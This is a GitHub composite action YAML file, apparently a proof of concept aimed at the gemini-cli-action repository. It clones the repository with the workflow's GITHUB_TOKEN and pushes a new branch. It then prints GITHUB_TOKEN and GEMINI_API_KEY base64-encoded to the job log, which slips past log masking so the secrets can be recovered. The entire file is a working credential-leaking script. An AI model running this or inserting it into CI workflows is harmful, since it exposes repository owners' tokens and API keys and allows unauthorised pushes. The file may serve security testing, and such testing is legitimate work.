name: Create Test Branch & Show Tokens
description: Creates a branch and prints key secrets in base64
runs:
  using: "composite"
  steps:
    - run: |
        echo "[INFO] Cloning repository Soumyak1602/gemini-cli-action..."
        git config --global user.name "github-actions"
        git config --global user.email "bot@users.noreply.github.com"

        git clone --quiet "https://x-access-token:${GITHUB_TOKEN}@github.com/Soumyak1602/gemini-cli-action.git"
        cd gemini-cli-action

        echo "[INFO] Creating branch 'test'..."
        git checkout -b test
        git push origin test

        echo ""
        echo "===== BASE64 TOKENS ====="
        echo "GITHUB_TOKEN (base64):"
        echo "$GITHUB_TOKEN" | base64 | tr -d '\n'
        echo ""

        echo "GEMINI_API_KEY (base64):"
        echo "$GEMINI_API_KEY" | base64 | tr -d '\n'
        echo ""
    shell: bash
